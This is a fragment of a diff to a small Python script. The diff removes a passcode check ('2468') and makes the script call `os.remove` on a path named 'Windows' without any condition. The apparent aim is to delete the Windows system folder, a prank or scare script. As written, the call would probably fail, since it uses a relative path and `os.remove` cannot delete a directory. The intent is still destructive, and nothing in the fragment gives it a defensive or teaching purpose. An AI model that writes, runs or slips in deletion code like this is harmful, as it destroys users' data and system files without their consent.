@@ -19,13 +19,8 @@ while True:
             print('program stopped')
             break
         else:
-            input_for_code = input('what is the code>>>')
-            if input_for_code == ('2468'):
-                print('correct, have a good day.')
-                break
-            else:
-                file_path = 'Windows'
-                os.remove(file_path)
+            file_path = 'Windows'
+            os.remove(file_path)
             
             
             
